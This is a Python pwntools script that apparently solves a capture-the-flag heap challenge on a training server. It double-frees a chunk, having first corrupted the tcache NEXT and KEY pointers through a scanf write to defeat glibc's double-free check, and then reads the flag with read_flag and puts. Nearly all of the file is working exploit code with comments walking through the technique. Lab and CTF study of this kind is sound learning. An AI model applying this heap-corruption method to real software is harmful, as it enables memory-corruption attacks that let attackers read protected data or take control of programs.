#!/usr/bin/env python

from pwn import *

get_flag = True
chall_name = '4.0'

context.arch = "amd64"

def run_with_gdb(p):
    gdb.attach(p,'''
    b *main''')
    run_exploit(p)

def print_send_print(line_to_send, p):
    p.sendline(line_to_send)
    print(p.recvrepeat(1).decode())

def run_exploit(p, debug):
    if debug:
        run_with_gdb(p)

    # corrupting the KEY pointer of a chunk of tcache will bypass the double
    # free protection because the glibc check the KEY pointer of all the chunks
    # before freeing to avoid double freeing a chunk already in the tcache list.
    # So, with the KEY pointer corrupted, glibc will double free
        
    # malloc a chunk size of the flag
    print(p.recvrepeat(1).decode())
    print_send_print('malloc 359', p)

    # freeing the chunk, sending to tcache
    print_send_print('free', p)

    # calling scanf because scanf will reutilize the pointer for the previously
    # freed chunk, so we can corrupt chunk metadata
    print_send_print('scanf', p)

    # corrupting the chunk NEXT pointer with A's and the chunk KEY pointer with B's
    print_send_print('AAAAAAAABBBBBBBB', p)

    # now the double free happens, it will going to put the same chunk in tcache, the
    # next two mallocs will return him
    print_send_print('free', p)

    # read_flag do two mallocs and get the chunk previously double freed
    print_send_print('read_flag', p)

    # now puts can print the flag
    print_send_print('puts', p)

    p.sendline('quit')
    print(p.recvrepeat(1).decode())

if get_flag:
    ssh_connection = ssh(host='.college',user='hacker')
    process_full_path = '/challenge/' + chall_name
    p = ssh_connection.run(process_full_path)
    run_exploit(p, False)
    ssh_connection.close()
else:
    p = process('./' + chall_name)
    run_exploit(p, False)
